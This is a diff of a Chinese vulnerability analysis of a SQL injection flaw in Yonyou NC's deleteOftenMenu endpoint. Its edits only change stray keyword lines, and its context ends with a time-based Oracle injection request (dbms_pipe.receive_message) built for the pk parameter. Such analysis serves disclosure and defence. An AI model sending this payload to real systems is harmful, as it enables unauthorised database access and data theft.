@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用deleteOftenMenu传入的参数实现[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")，从而窃取服务器的敏感信息。
 
-商务软件和生产力软件
+云存储
 
 # 影响版本
 
@@ -79,14 +79,6 @@ public class DeleteOftenMenuAction extends BaseAction {
     }
 }
 ```
-
-深入探索
-
-计算机安全
-
-计算机科学
-
-网安
 
 pk 直接拼接进SQL语句后，带入 queryVOs 函数，其实现逻辑如下
 
@@ -217,7 +209,7 @@ private <T extends SuperVO> T[] queryVOByPinfo(JdbcSession ses, String sql, Stri
 
 同样因为存在 `LfwRuntimeEnvironment.getLfwSessionBean()` ，[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用需要登录权限
 
-计算机服务器
+网络
 
 ```
 GET /portal/pt/deleteMenu/deleteOftenMenu?pageId=login&pk=1'AND+1=dbms_pipe.receive_message('RDS', 6)-- HTTP/1.0
